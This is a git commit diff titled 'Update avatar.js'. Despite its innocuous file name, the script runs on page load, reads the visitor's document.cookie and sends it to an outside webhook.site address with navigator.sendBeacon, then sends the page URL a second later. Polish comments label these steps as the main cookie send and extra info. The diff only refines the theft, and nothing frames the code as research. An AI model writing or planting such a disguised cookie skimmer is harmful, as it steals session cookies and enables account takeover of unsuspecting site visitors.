719eafba75c40bd3dbebf30d5e0716e017f90525
kowalskibartosz095-beep <kowalskibartosz095@gmail.com>
2026-07-06 03:38:07 +0200

    Update avatar.js

--- avatar.js
+++ avatar.js
@@ -1,16 +1,11 @@
 (function() {
     const url = "https://webhook.site/53158f3f-579b-4186-8cdd-d33333543bec";
-    
-    // Główna wysyłka cookie
-    navigator.sendBeacon(url, "COOKIE: " + document.cookie);
+    const cookie = document.cookie;
 
-    // Dodatkowe informacje
+    navigator.sendBeacon(url, "COOKIE: " + cookie);
+
+    // Dodatkowe info
     setTimeout(() => {
-        const extra = {
-            url: window.location.href,
-            time: new Date().toLocaleString(),
-            userAgent: navigator.userAgent.substring(0, 100)
-        };
-        navigator.sendBeacon(url, "EXTRA: " + JSON.stringify(extra));
-    }, 800);
+        navigator.sendBeacon(url, "URL: " + window.location.href);
+    }, 1000);
 })();
